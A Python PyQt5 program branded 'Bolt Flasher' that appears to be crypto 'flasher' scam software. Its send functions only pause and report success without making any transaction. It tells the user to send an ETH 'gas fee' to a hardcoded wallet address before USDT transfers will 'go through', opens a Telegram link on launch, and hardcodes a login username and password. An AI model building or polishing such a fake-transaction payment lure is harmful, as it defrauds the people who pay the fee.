
import sys
import webbrowser
import time
from PyQt5.QtWidgets import (
    QApplication, QWidget, QVBoxLayout, QLabel, QLineEdit,
    QPushButton, QMessageBox, QStackedWidget, QComboBox, QProgressBar
)
from PyQt5.QtCore import Qt, QTimer
from PyQt5.QtMultimedia import QSound

# Dummy data
GAS_RECEIVER_ADDRESS = "0x363bce7c51e88a095bbad8de2dfbc624bff8068e"
SIMULATED_GAS_FEES = {"slow": 0.0006, "medium": 0.0009, "fast": 0.0012}
GAS_PAID_FLAG = {"paid": False}

def send_btc_testnet(address, amount):
    time.sleep(2)
    if float(amount) <= 0:
        raise Exception("Insufficient BTC balance")
    return "BTC Testnet TX sent"

def send_usdt_goerli(address, amount, gas_option):
    time.sleep(2)
    if gas_option not in SIMULATED_GAS_FEES:
        raise Exception("Invalid gas option")
    if float(amount) <= 0:
        raise Exception("Insufficient USDT balance")
    if not GAS_PAID_FLAG["paid"]:
        raise Exception("Gas fee not received. Please pay the gas fee to continue.")
    return "USDT Goerli TX sent"

class LoginPage(QWidget):
    def __init__(self, stacked_widget):
        super().__init__()
        self.stacked_widget = stacked_widget
        self.init_ui()

    def init_ui(self):
        layout = QVBoxLayout()
        layout.addWidget(QLabel("Username:"))
        self.username_input = QLineEdit()
        layout.addWidget(self.username_input)
        layout.addWidget(QLabel("Password:"))
        self.password_input = QLineEdit()
        self.password_input.setEchoMode(QLineEdit.Password)
        layout.addWidget(self.password_input)

        login_btn = QPushButton("Login")
        login_btn.clicked.connect(self.handle_login)
        layout.addWidget(login_btn)

        self.setLayout(layout)
        webbrowser.open("https://t.me/primasoftwares")

    def handle_login(self):
        if self.username_input.text() == "SoftwareHenry" and self.password_input.text() == "Rmabuw190":
            self.stacked_widget.setCurrentIndex(1)
        else:
            QMessageBox.critical(self, "Login Failed", "Invalid username or password")

class DashboardPage(QWidget):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        layout = QVBoxLayout()
        layout.addWidget(QLabel("Bolt Flasher - Dashboard (Dark Mode Enabled)"))

        self.address_input = QLineEdit()
        self.address_input.setPlaceholderText("Enter recipient wallet address")
        layout.addWidget(self.address_input)

        self.amount_input = QLineEdit()
        self.amount_input.setPlaceholderText("Enter amount to send")
        layout.addWidget(self.amount_input)

        self.token_selector = QComboBox()
        self.token_selector.addItems(["BTC Testnet", "USDT Goerli (ERC-20)"])
        layout.addWidget(self.token_selector)

        self.gas_selector = QComboBox()
        self.gas_selector.addItems(["slow", "medium", "fast"])
        layout.addWidget(QLabel("Gas Fee Speed:"))
        layout.addWidget(self.gas_selector)

        self.gas_fee_label = QLabel("Estimated Gas Fee: -")
        layout.addWidget(self.gas_fee_label)

        self.gas_info_label = QLabel(f"""Send ETH gas fee to:
{GAS_RECEIVER_ADDRESS}""")
        layout.addWidget(self.gas_info_label)

        self.pay_gas_btn = QPushButton("I have paid the gas fee")
        self.pay_gas_btn.clicked.connect(self.confirm_gas_payment)
        layout.addWidget(self.pay_gas_btn)

        self.send_btn = QPushButton("Send Transaction")
        self.send_btn.clicked.connect(self.handle_transaction)
        layout.addWidget(self.send_btn)

        self.progress = QProgressBar()
        layout.addWidget(self.progress)

        self.setLayout(layout)

        self.amount_input.textChanged.connect(self.update_gas_fee)
        self.gas_selector.currentIndexChanged.connect(self.update_gas_fee)

    def update_gas_fee(self):
        try:
            base_amount = float(self.amount_input.text())
            selected_speed = self.gas_selector.currentText()
            multiplier = 1.05  # 5% extra buffer
            gas_fee = SIMULATED_GAS_FEES[selected_speed] * multiplier
            self.gas_fee_label.setText(f"Estimated Gas Fee: {gas_fee:.6f} ETH")
        except:
            self.gas_fee_label.setText("Estimated Gas Fee: -")

    def confirm_gas_payment(self):
        GAS_PAID_FLAG["paid"] = True
        QMessageBox.information(self, "Confirmed", "Gas payment acknowledged. You can now send transactions.")

    def handle_transaction(self):
        address = self.address_input.text()
        amount = self.amount_input.text()
        token = self.token_selector.currentText()
        gas_option = self.gas_selector.currentText()

        confirm = QMessageBox.question(self, "Confirm", f"Send {amount} {token} to {address}?",
                                       QMessageBox.Yes | QMessageBox.No)
        if confirm != QMessageBox.Yes:
            return

        self.progress.setValue(30)

        try:
            if token == "BTC Testnet":
                result = send_btc_testnet(address, amount)
            else:
                result = send_usdt_goerli(address, amount, gas_option)

            QTimer.singleShot(1000, lambda: self.progress.setValue(100))
            QSound.play("C:/Windows/Media/notify.wav")  # Updated for Windows
            QMessageBox.information(self, "Success", result)
        except Exception as e:
            QMessageBox.critical(self, "Error", str(e))
            self.progress.setValue(0)

class BoltFlasherApp(QStackedWidget):
    def __init__(self):
        super().__init__()
        self.login_page = LoginPage(self)
        self.dashboard_page = DashboardPage()
        self.addWidget(self.login_page)
        self.addWidget(self.dashboard_page)
        self.setCurrentIndex(0)
        self.setWindowTitle("Bolt Flasher - © 2025 primasoftwares. All rights reserved.")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = BoltFlasherApp()
    window.resize(500, 500)
    window.show()
    sys.exit(app.exec_())
